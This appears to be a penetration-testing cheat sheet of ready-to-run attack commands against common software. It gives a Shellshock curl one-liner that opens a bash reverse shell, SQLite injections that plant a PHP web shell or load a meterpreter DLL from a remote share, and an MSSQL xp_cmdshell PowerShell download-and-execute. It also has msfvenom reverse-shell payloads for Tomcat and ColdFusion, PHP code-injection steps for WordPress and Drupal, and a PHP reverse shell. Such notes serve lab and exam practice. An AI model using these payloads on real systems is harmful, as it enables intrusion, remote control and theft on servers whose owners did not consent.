### Shellshock
```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.119.199/443 0>&1' http://10.11.1.71/cgi-bin/admin.cgi
```

## Database
### Sqlite
```
ATTACH DATABASE ‘/var/www/lol.php’ AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES (‘<? system($_GET[‘cmd’]); ?>’;--
```
or
```
?name=123 UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```
### MsSQL
```
mssqlclient.py -p 1433 EXAMPLE\Administrator@DC01 -windows-auth
enable_xp_cmdshell
xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://192.168.119.199/rev.ps1\")
```

## Common framework
### Tomcat
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.199 LPORT=443 -f war > shell.war
```
Deploy .war through /manager/html
https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/
### Coldfusion
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.199 LPORT=443 -f raw > shell.jsp
```
Upload through schedule task
### Wordpress
Edit 404.php in `Appearance`
### Drupal
Enable php in options
New post with php code

## Reverse shell
php
```
<?php
print shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.119.199/443 0>&1'");
?>
```
